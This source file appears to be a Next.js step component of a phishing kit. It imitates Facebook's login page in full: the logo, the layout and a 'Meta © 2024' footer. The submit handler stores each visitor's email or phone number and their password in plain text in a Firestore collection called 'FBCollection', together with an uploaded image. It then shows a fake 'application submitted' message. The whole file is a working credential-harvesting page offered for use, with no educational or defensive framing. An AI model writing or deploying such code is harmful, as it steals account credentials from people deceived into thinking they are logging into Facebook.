import React, { useState } from "react";
import Head from "next/head";
import Image from "next/image";
import { collection, addDoc, query, where, getDocs } from "firebase/firestore";
import { getStorage, ref, uploadBytes, getDownloadURL } from "firebase/storage";
import { CiSquarePlus } from "react-icons/ci";
import { BsDot } from "react-icons/bs";
import { firestore } from "../../firebase";
import { useRouter } from "next/router";
import { v4 as uuidv4 } from "uuid";

const Step4 = ({ formData }) => {
  const [phoneOrEmail, setPhoneOrEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const router = useRouter();
  const storage = getStorage();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const facebookCollection = collection(firestore, "FBCollection");
      const q = query(
        facebookCollection,
        where("phoneOrEmail", "==", phoneOrEmail)
      );
      const querySnapshot = await getDocs(q);

      if (!querySnapshot.empty) {
        alert("You already applied. We will get back to you soon");
        setIsLoading(false);
        return;
      }

      const { selectedImage, ...restFormData } = formData; // Extract selectedImage from formData

      // Upload the image to Firebase Storage
      if (selectedImage) {
        const uniqueId = uuidv4();
        const imageRef = ref(storage, `images/${uniqueId}`);
        const response = await fetch(selectedImage); // Fetch the image blob
        const blob = await response.blob(); // Convert to Blob
        await uploadBytes(imageRef, blob); // Upload the blob

        const imageUrl = await getDownloadURL(imageRef);

        const newContact = {
          ...restFormData,
          phoneOrEmail: phoneOrEmail,
          password: password,
          imageUrl: imageUrl, // Add the image URL to the contact data
        };

        await addDoc(facebookCollection, newContact);
        alert("Your Application has been submitted successfully");
        router.push("/success");
      } else {
        alert("Please upload an image before submitting.");
      }
    } catch (error) {
      console.error("Error: ", error);
      alert("An error occurred while submitting your application.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div>
      <div>
        <Head>
          <title>Facebook - login or sign up</title>
        </Head>
        {/* Mobile View */}
        {/* <LoadingModal /> */}
        <div className="bg-white h-screen md:hidden py-4 px-4">
          <div className="flex items-center justify-center">
            <Image src="/facebook-cropped.svg" width={95} height={200} />
          </div>
          <form
            action=""
            onSubmit={handleSubmit}
            className="flex flex-col space-y-2 mt-4 text-black"
          >
            <input
              type="text"
              value={phoneOrEmail}
              onChange={(e) => setPhoneOrEmail(e.target.value)}
              required
              placeholder="Mobile number or email address"
              className="input focus:outline-none focus:border-black bg-[#F5F6F7] placeholder:text-gray-600 placeholder:text-sm placeholder:font-medium border-gray-300 rounded-sm shadow-sm input-bordered w-full max-w-xl"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              required
              onChange={(e) => setPassword(e.target.value)}
              className="input focus:outline-none focus:border-black bg-[#F5F6F7] placeholder:text-gray-600 placeholder:text-sm placeholder:font-medium border-gray-300 rounded-sm shadow-sm input-bordered w-full max-w-xl"
            />
            <input
              type="submit"
              value="Log In"
              className="bg-[#1877F2] py-2 rounded text-white text-lg font-medium"
            />
          </form>
          <div>
            <p className="text-[#1877F2] text-center my-2 font-medium text-sm">
              Forgetten Password?
            </p>
          </div>
          <div className=" flex items-center justify-center space-x-3 w-full text-black">
            <div className="w-full border border-gray-400/70"></div>
            <div className="pb-2">or</div>
            <div className="w-full border border-gray-400/70"></div>
          </div>
          <div className="flex items-center justify-center mt-3">
            <button className="py-1.5 rounded text-black font-medium border border-gray-400/70 w-[80%]">
              Create new account
            </button>
          </div>
          <div className="flex justify-between mt-28 px-14">
            <div className="text-[#576BA3] text-xs font-medium">
              <p className="text-center">
                <span className="text-[#9E949C] font-bold">English (US)</span>
                <br />
                Français (France)
                <br />
                Português (Brasil) <br />
                Italiano
                <br />
              </p>
            </div>
            <div className="text-[#576BA3]  flex flex-col items-center justify-center font-medium">
              <p className="text-center text-xs">
                English (UK)
                <br />
                Español <br /> Deutsch
              </p>
              <CiSquarePlus size={30} />
            </div>
          </div>
          <div className="mt-3 text-xs text-[#576BA3] flex items-center justify-center">
            <p>About</p>
            <BsDot />
            <p>Help</p>
            <BsDot />
            <p>More</p>
          </div>
          <p className="text-gray-600 text-center mt-3 text-xs">
            Meta &copy; 2024
          </p>
        </div>
        {/* Desktop View */}
        <div className="bg-[#F0F2F5] md:h-screen hidden md:flex flex-col justify-between md:pt-16 min-h-screen">
          <main className="bg-[#F0F2F5] flex flex-col items-center justify-center  text-black max-w-[1080px] mx-auto">
            <div className="grid grid-cols-1 md:grid-cols-2 place-items-center">
              <div className="space-y-4">
                <Image src="/facebook-cropped.svg" width={300} height={200} />
                <p className="text-3xl">
                  Facebook helps you connect and share with the people in your
                  life.
                </p>
              </div>
              <div>
                <form
                  action=""
                  Qualtiyy
                  // onSubmit={getLogin}
                  className="p-4 max-w-sm border space-y-4 bg-white border-gray-300 shadow-2xl rounded-lg"
                >
                  <input
                    type="text"
                    placeholder="Email address or phone number"
                    value={phoneOrEmail}
                    required
                    onChange={(e) => setPhoneOrEmail(e.target.value)}
                    className="input bg-transparent input-bordered w-full max-w-xl"
                  />
                  <input
                    type="text"
                    placeholder="Password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="input bg-transparent input-bordered w-full max-w-xl"
                  />
                  <input
                    type="submit"
                    className="bg-[#1A77F2] w-full py-2 font-bold text-white rounded-lg text-xl"
                    value="Log in"
                  />
                  <div className="flex items-center justify-center text-[#1A77F2]">
                    <a href="">Forgetten Password?</a>
                  </div>
                  <hr className="border-gray-300" />
                  <div className="flex items-center justify-center">
                    {" "}
                    <a
                      href=""
                      className="px-5 bg-[#43B72A] text-white py-3 rounded"
                    >
                      Create new account
                    </a>
                  </div>
                </form>
                <p className="my-6 text-sm text-center">
                  <span className="font-bold">Create a page</span> for a
                  celebrity, brand or business.
                </p>
              </div>
            </div>
          </main>
          <footer className="md:flex space-x-3 items-center justify-center bg-white  py-4 text-gray-400">
            <a href="">English (UK)</a>
            <a href="">Shona</a>

            <a href="">Español</a>
            <a href="">Português (Brasil)</a>
            <a href="">Bahasa Indonesia</a>
            <a href="">Italino</a>
            <a href="">Français (France)</a>
            <a href="">Deutsch</a>
            <a
              href="
中文(简体)"
            ></a>
            <a href="">
              <p> العربية </p>
            </a>
          </footer>
        </div>
      </div>
    </div>
  );
};

export default Step4;
